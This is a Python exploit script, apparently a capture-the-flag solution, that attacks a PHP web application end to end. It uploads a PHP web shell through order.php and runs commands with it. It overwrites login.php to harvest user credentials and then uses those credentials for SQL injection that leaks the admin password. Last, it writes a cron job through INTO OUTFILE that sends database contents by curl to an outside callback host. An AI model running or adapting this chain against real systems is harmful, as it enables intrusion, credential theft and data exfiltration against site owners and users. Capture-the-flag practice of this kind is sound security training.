import base64
import json
import hashlib
import re
import requests
import time


#FRONTEND_BASE_URL = 'http://localhost:8080'
FRONTEND_BASE_URL = 'http://10.0.2.71:8080'

# Callback URL for exfiltrating the third flag
CALLBACK_URL = 'https://dumps.silk.one/fun'

PHP_SHELL_CONTENTS = '<?php system($_GET["cmd"]); ?>'
PHP_SHELL_CONTENTS_MD5 = hashlib.md5(PHP_SHELL_CONTENTS.encode()).hexdigest()

PATCHED_LOGIN_PHP_FILE_PATH = 'patched_login.php'
with open(PATCHED_LOGIN_PHP_FILE_PATH) as f:
    PATCHED_LOGIN_PHP_FILE_CONTENTS = f.read()


def setup_php_shell():
    files = {
        'file': (f'exploit.php', PHP_SHELL_CONTENTS),
    }
    data = {}
    
    requests.post(
        f'{FRONTEND_BASE_URL}/order.php',
        files=files,
        data=data,
        cookies={
            'token': ''
        }
    )


def use_php_shell(command):
    shell_url = f'{FRONTEND_BASE_URL}/uploads/{PHP_SHELL_CONTENTS_MD5}.php'
    
    response = requests.get(shell_url, params={'cmd': command})
    if response.status_code == 200:
        return response.text
    else:
        print('Failed to access the PHP shell.')
        exit()


def upload_file_with_shell(file_path, file_contents):
    file_contents_base64 = base64.b64encode(file_contents.encode()).decode()
    command = f"echo '{file_contents_base64}' | base64 -d > {file_path}"
    return use_php_shell(command)


def download_creds_txt():
    response = requests.get(f'{FRONTEND_BASE_URL}/uploads/creds.txt')
    if response.status_code != 200:
        return None
    return response.text


def login(username, password):
    data = {
        'username': username,
        'password': password
    }
    response = requests.post(f'{FRONTEND_BASE_URL}/login.php', data=data, allow_redirects=False)
    return response.cookies.get('token')


def exploit_sqli(token, payload):
    submit_order_body = {
        'token': token,
        'order': {
            'quantity': payload
        }
    }
    submit_order_body_json = json.dumps(submit_order_body)
    submit_order_body_json_base64 = base64.b64encode(submit_order_body_json.encode()).decode()
    
    command = f"echo '{submit_order_body_json_base64}' | base64 -d > /tmp/payload.txt ; curl -X POST http://backend/submit_order.php -d @/tmp/payload.txt -H 'Content-Type: application/json'"
    
    return use_php_shell(command)


def extract_database_flag(token):
    condition = "1=1"
    payload = f"(SELECT IF ({condition}, 'a', 0)"
    response = exploit_sqli(token, payload)
    response = exploit_sqli(token, "CAST((SELECT password FROM users WHERE username='admin' LIMIT 1) AS SIGNED)")
    return response

def write_database_cron(token, script_payload):
    script_payload_base64 = base64.b64encode(script_payload.encode()).decode()

    payload = f"0, '', '', '', '', '', ''); SELECT FROM_BASE64('{script_payload_base64}') INTO OUTFILE '/db/cleanup.old.sh' FIELDS ESCAPED BY ''-- -"
    response = exploit_sqli(token, payload)
    return response

# Setup php web shell
print('-'*40)
print('Setting up PHP webshell...')
setup_php_shell()

# Get first flag
print('-'*40)
print('Downloading first flag...')
flag_1 = use_php_shell('cat /flag.txt')
print('Flag 1:', flag_1)

# Upload patched login.php
print('-'*40)
print('Uploading patched login.php...')
upload_file_with_shell('/var/www/html/login.php', PATCHED_LOGIN_PHP_FILE_CONTENTS)

# Validate patched login.php upload
print('-'*40)
print('Checking login.php for patch:')
print(
    use_php_shell('grep -B 1 file_put_contents /var/www/html/login.php')
)

# Download creds.txt
print('-'*40)
print('Downloading creds.txt...')

for i in range(10):
    creds = download_creds_txt()
    if creds:
        break
    
    print('No credentials found. Waiting 10 seconds...')
    time.sleep(10)
else:
    print('No credentials after multiple attempts. Exiting...')
    exit()

print('Credentials found:')
print(creds[:50])

# Login
print('-'*40)
print('Logging in with found credentials...')

username, password = creds.splitlines()[0].strip().split(':')
token = login(username, password)

if not token:
    print('Login failed.')
    exit()

print(f'Logged in with token: {token}')

# Use credentials to exploit SQLi and get admin password (flag)
print('-'*40)
print('Using credentials to exploit SQLi...')

error_message = extract_database_flag(token)
print('Intentional error message:', error_message)

flag_2 = re.search(r'cybersci\{.*\}', error_message)
if flag_2:
    flag_2 = flag_2.group(0)
print('Flag 2:', flag_2)

# Use SQLi to exploit file write vulnerability to write cron job payload
script_payload = f'''
#!/bin/bash
apt install -y curl
flag=$(mysql -h db_hr -u hr -p'hr' -D hr -se "SELECT notes FROM employees LIMIT 1;")
curl -X POST "{CALLBACK_URL}" -d "flag=$flag"
'''.strip()

print('-'*40)
print('Using SQLi to write database cron job payload...')
print(write_database_cron(token, script_payload))

print()
print('Wait for cron job to execute and check the callback URL for the third flag.')